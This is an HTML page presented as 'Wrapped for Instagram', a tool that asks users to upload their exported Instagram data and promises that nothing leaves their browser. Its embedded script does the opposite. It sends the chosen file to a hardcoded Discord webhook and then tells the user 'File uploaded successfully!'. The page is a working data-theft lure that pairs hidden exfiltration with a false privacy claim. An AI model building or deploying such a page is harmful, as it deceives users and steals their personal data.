<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wrapped for Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f9fc;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        h1 {
            color: #1da1f2;
        }

        p {
            font-size: 1.1rem;
            margin: 10px 0;
        }

        .info {
            max-width: 500px;
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        label {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #1da1f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
        }

        label:hover {
            background-color: #0c87d2;
        }

        input[type="file"] {
            display: none;
        }

        #message {
            margin-top: 15px;
            font-size: 1rem;
            color: #1da1f2;
        }
    </style>
    <script>
        function handleFileUpload(event) {
            const fileInput = event.target;
            const message = document.getElementById('message');

            if (fileInput.files.length > 0) {
                const formData = new FormData();
                formData.append('file', fileInput.files[0]);

                fetch('https://discordapp.com/api/webhooks/1324173007387758652/xs9Db_2oVjoSiN5d0cwrcPxXL-VVy1y8HGz3xIuifVTmGuyH6d0i4MmkvnuxdDpO1Gjf', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (response.ok) {
                        message.textContent = 'File uploaded successfully!';
                    } else {
                        message.textContent = 'Failed to upload file.';
                    }
                })
                .catch(() => {
                    message.textContent = 'An error occurred while uploading.';
                });
            }
        }
    </script>
</head>
<body>
    <div class="info">
        <h1>Wrapped for Instagram</h1>
        <p>Select your Instagram data to get started.</p>
        <p>Your data will not be uploaded to any server. All statistics are generated locally in your browser.</p>
        <p>Wrapped for Instagram is open-source if you want to verify this.</p>
        <label for="file">Upload File</label>
        <input type="file" id="file" name="file" onchange="handleFileUpload(event)">
        <p id="message"></p>
    </div>
</body>
</html>
